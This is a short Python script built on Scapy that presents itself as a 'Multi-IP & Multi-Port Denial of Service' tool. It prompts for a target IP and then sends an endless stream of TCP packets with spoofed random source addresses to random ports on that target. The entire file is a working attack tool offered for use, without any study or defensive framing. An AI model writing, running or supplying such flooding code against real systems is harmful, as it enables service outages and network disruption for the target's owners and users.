#!/usr/bin/env python3

import random
import time
import sys

try:
    from scapy.all import *
except:
    sys.exit("[!] Script requires Scapy ")

def RandomIP():
    #
    random_addr = ""
    #
    for i in range(1,4):
        #
        value = random.randint(1,255)
        #
        random_addr += str(value)+'.'
        #
    random_addr = random_addr+str(random.randint(1,255))
    #
    return random_addr

def main():
    #
    print('''
            <-- Multi-IP & Multi-Port Denial of Service -->
          ''')
          #
    time.sleep(1)
    #
    target = input("[+] Enter the target IP-> ")
    #
    packet_count = 0
    #
    print("*** Initiating Denial of Service Attack ***")
    #
    time.sleep(3)
    #
    while(True):
        #
        start_port = random.randint(1,1000)
        #
        end_port = random.randint(1000,65535)
        #
        for s in range(start_port,end_port):
            #
            source = RandomIP()
            #
            port = random.randint(1,65536)
            #
            ip_header = IP(src=source,dst=target)
            #
            tcp_header = TCP(sport=s,dport=port)
            #
            pkt = ip_header/tcp_header
            #
            send(pkt,inter=.0001,verbose=False)
            #
            print("[*] %s sent packet to %s:%i | Packet Count: %i " % (source,target,port,packet_count))
            #
            packet_count += 1

if(__name__ == '__main__'):
    #
    main()
